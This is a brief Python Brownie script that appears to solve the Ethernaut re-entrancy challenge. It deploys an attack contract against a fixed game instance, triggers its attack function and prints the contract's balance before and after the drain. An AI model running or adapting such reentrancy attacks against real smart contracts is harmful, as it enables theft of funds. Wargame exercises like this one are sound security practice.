from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0x561Ca003B90617eeca74692FEF51BB20EcAaA19d"
AMOUNT = "0.001 ether"
GAS_LIMIT = 6000000


def main():

    player = get_account()

    # target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)

    # deploy attack contract     <><><><><><><><><>
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, AMOUNT, {"from": player})

    #
    print(f"Attack10 balance pre-attack = {web3.eth.get_balance(attack.address())}")

    # HERE!!!!!
    attack.attack({"from": player, "allow_revert": True, "gas_limit": GAS_LIMIT})

    #
    print(f"Attack10 balance post-attack = {web3.eth.get_balance(attack.address())}")
